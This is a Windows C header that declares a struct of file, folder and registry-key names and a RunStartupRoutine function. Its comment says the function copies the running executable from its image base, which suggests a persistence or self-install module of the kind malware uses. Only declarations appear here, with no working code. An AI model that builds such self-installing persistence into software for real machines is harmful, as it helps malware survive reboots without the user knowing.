#pragma once

#include <Windows.h>

#include <ShlObj.h>
#include <Shlwapi.h>

// Link dependencies
#pragma comment(lib, "shlwapi.lib")

typedef struct _INSTALLATION_INFO {

	LPWSTR wStrFileName;
	LPWSTR wStrFolderName;
	LPWSTR wStrRegKeyName;

	DWORD dwInstallationAttributes;

} INSTALLATION_INFO, *PINSTALLATION_INFO;

/// <summary>Should be called using CreateThread. Will install the PE from the current imagebase.
/// <para>Parameter takes a pointer to an initialized INSTALLATION_INFO structure.</para>
/// </summary>
VOID RunStartupRoutine(LPVOID lpParam);